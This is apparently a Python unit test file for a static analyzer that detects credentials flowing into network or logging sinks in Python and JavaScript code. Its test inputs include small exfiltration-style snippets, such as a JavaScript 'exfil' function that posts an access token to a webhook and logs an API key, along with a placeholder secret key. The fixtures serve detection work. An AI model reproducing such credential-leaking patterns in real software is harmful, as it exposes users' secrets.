#!/usr/bin/env python3
"""Unit tests for ast_analyzer (credential->sink flow detection). Run: python3 test_ast_analyzer.py"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
from ast_analyzer import analyze

_fails = []


def check(name, cond):
    print(("PASS" if cond else "FAIL"), "-", name)
    if not cond:
        _fails.append(name)


# 1. Python: credential variable flows into a network sink
f = analyze("def upload(url):\n    requests.post(url, data=API_KEY)\n", "python")
check("py network var -> flagged (network, fn=upload)",
      len(f) == 1 and f[0]["sink_class"] == "network" and f[0]["function"] == "upload")

# 2. Python: token printed (logging sink)
f = analyze('def dbg(token):\n    print(f"token={token}")\n', "python")
check("py log f-string -> flagged (log)", any(x["sink_class"] == "log" for x in f))

# 3. Python: hardcoded literal with NO sink -> AST detects no FLOW (regex's job, not AST's)
f = analyze('API_KEY = "sk-abcdef123456"\n', "python")
check("py hardcoded, no sink -> 0", len(f) == 0)

# 4. Python: benign value into a sink -> not flagged
f = analyze("def g(url, payload):\n    requests.post(url, data=payload)\n", "python")
check("py benign sink -> 0", len(f) == 0)

# 5. Python: credential LITERAL passed into a sink
f = analyze('def g(u):\n    requests.post(u, data="sk-abcdef123456")\n', "python")
check("py cred-literal in sink -> flagged", len(f) == 1 and f[0]["sink_class"] == "network")

# 6. JavaScript: exfil via fetch + console.log
f = analyze("function exfil(){ fetch(WEBHOOK, {body: accessToken}); console.log(apiKey); }", "javascript")
check("js network+log -> >=2 flagged", sum(x["sink_class"] in ("network", "log") for x in f) >= 2)

# 7. JavaScript: benign -> not flagged
f = analyze("function g(data){ fetch(url, {body: data}); }", "javascript")
check("js benign -> 0", len(f) == 0)

# 8. JavaScript: credential literal in console.log
f = analyze('console.log("sk-abcdef123456xyz");', "javascript")
check("js cred-literal log -> flagged (log)", len(f) == 1 and f[0]["sink_class"] == "log")

# 9. TypeScript parsed as JS can yield tree-sitter ERROR nodes; the reported sink must
#    stay a concise callee, never a whole function body (regression for the blob bug
#    seen on a real Discord/Teams skill). Assert every sink is short + whitespace-free.
ts = ('async function connect(): Promise<void> {\n'
      '  const { token } = await this.client.gatewayConnect();\n'
      '  this.token = token;\n'
      '  fetch(GATEWAY_URL, { headers: { Authorization: `Bearer ${token}` } });\n'
      '}\n')
f = analyze(ts, "javascript")
check("ts-as-js: sinks stay concise (no function-body blobs)",
      all(len(x["sink"]) <= 64 and not any(c.isspace() for c in x["sink"]) for x in f))

def test_all_checks_pass():
    """pytest entry point: the checks above run at import; assert none failed."""
    assert not _fails, f"{len(_fails)} failed: {_fails}"


if __name__ == "__main__":
    if _fails:
        print(f"\n{len(_fails)} FAILED: {_fails}")
        sys.exit(1)
    print("\nALL AST TESTS PASSED (9/9)")
